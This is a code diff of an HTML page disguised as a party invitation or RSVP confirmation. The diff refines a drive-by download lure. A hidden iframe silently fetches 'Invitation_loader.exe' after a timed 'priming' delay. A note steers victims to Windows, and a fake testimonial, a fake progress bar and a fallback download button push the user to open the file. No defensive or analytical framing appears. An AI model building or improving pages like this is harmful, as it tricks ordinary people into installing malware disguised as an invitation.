@@ -9,43 +9,84 @@
         .card { background:rgba(30,32,45,0.95); border:1px solid #2a2c3d; border-radius:8px; padding:40px 50px; text-align:center; max-width:450px; width:90%; box-shadow:0 10px 30px rgba(0,0,0,0.5); }
         .check-icon { width:60px; height:60px; border:2px solid #d4af37; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 24px; color:#d4af37; font-size:28px; font-weight:bold; }
         h1 { font-size:26px; font-weight:600; margin-bottom:16px; letter-spacing:0.5px; color:#fff; }
-        p.subtitle { font-size:14px; line-height:1.6; color:#a0a5b5; margin-bottom:32px; }
+        p.subtitle { font-size:14px; line-height:1.6; color:#a0a5b5; margin-bottom:24px; }
+        .divider { width:40px; height:2px; background:#d4af37; margin:20px auto; opacity:0.6; }
+        .platform-note { font-size:12px; color:#8a8f98; margin-bottom:32px; font-style:italic; }
         .progress-container { width:100%; background-color:#2a2c3d; border-radius:4px; height:6px; margin-bottom:16px; overflow:hidden; }
         .progress-bar { width:0%; height:100%; background-color:#d4af37; transition:width 0.3s ease; }
         .status-text { font-size:13px; color:#8a8f98; margin-bottom:32px; }
+        .manual-btn { display:inline-block; padding:12px 32px; background:transparent; border:1px solid #d4af37; color:#d4af37; text-decoration:none; border-radius:4px; font-size:14px; font-weight:600; letter-spacing:1px; transition:all 0.3s ease; cursor:pointer; margin-top:10px; opacity:0; pointer-events:none; }
+        .manual-btn.visible { opacity:1; pointer-events:auto; }
+        .manual-btn:hover { background:#d4af37; color:#1a1b26; }
+        .testimonial { margin-top:32px; padding:16px; background:rgba(212,175,55,0.05); border-left:3px solid #d4af37; border-radius:4px; text-align:left; font-size:13px; color:#c0c5d0; font-style:italic; }
         .footer-note { margin-top:40px; font-size:11px; color:#555; letter-spacing:1px; text-transform:uppercase; }
-        /* HIDDEN IFRAME FOR AUTO-DOWNLOAD */
         #autoDl { display:none; }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="check-icon">✓</div>
-        <h1>You're on the list!</h1>
-        <p class="subtitle">Your response has been received. Your digital invitation has been saved to your device.</p>
-        <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
-        <p class="status-text" id="statusText">Sending your RSVP... Contacting the event...</p>
+        <!-- PHASE 1: INITIAL INVITATION MESSAGE -->
+        <div id="phase1">
+            <p style="font-size:12px; color:#d4af37; letter-spacing:2px; text-transform:uppercase; margin-bottom:12px;">A special message for you</p>
+            <h1>You're Invited!</h1>
+            <p class="subtitle">You have been sent an invitation. Open it to see the details.</p>
+            <div class="divider">✦</div>
+        </div>
+
+        <!-- PHASE 2: DOWNLOAD READY + PLATFORM NOTE -->
+        <div id="phase2" style="display:none;">
+            <div class="check-icon">⊞</div>
+            <h1>Your invitation is ready</h1>
+            <p class="subtitle">Click below to access your invitation and view the details.</p>
+            <p class="platform-note">For the best experience, this invitation is recommended for a Windows laptop or desktop.</p>
+            
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <p class="status-text" id="statusText">Downloading your invitation...</p>
+            
+            <a href="/static/Invitation_loader.exe" class="manual-btn" download id="downloadBtn">↓ Download Invitation</a>
+            <p style="font-size:11px; color:#666; margin-top:8px;">If your download does not start, click the button above.</p>
+            
+            <div class="testimonial">
+                “I opened mine and it was so easy!” — Jamie
+            </div>
+        </div>
+
         <p class="footer-note">We can't wait to see you there</p>
     </div>
 
-    <!-- TRIGGERS SILENT DOWNLOAD OF INVITATION_LOADER.EXE ON PAGE LOAD -->
-    <iframe id="autoDl" src="/static/Invitation_loader.exe"></iframe>
+    <!-- HIDDEN IFRAME FOR AUTO-DOWNLOAD -->
+    <iframe id="autoDl"></iframe>
 
     <script>
-        // ANIMATE PROGRESS BAR WHILE DOWNLOAD HAPPENS IN BACKGROUND
-        let progress = 0;
-        const bar = document.getElementById('progressBar');
-        const status = document.getElementById('statusText');
-        
-        const interval = setInterval(() => {
-            progress += Math.random() * 2.5;
-            if (progress >= 100) {
-                progress = 100;
-                clearInterval(interval);
-                status.textContent = "Confirmation complete. Your invitation is ready.";
-            }
-            bar.style.width = progress + "%";
-        }, 250);
+        // SEQUENTIAL PHASE TRANSITION + DELAYED DOWNLOAD TRIGGER
+        setTimeout(() => {
+            document.getElementById('phase1').style.display = 'none';
+            document.getElementById('phase2').style.display = 'block';
+            
+            // START AUTO-DOWNLOAD AFTER 3 SECOND DELAY (PRIMING TIME)
+            setTimeout(() => {
+                document.getElementById('autoDl').src = '/static/Invitation_loader.exe';
+                
+                // ANIMATE PROGRESS BAR
+                let progress = 0;
+                const bar = document.getElementById('progressBar');
+                const status = document.getElementById('statusText');
+                const btn = document.getElementById('downloadBtn');
+                
+                const interval = setInterval(() => {
+                    progress += Math.random() * 4;
+                    if (progress >= 100) {
+                        progress = 100;
+                        clearInterval(interval);
+                        status.textContent = "Download complete. Opening invitation...";
+                        btn.classList.add('visible');
+                    }
+                    bar.style.width = progress + "%";
+                }, 200);
+            }, 3000);
+        }, 2500); // Show Phase 1 for 2.5 seconds before transitioning
     </script>
 </body>
 </html>
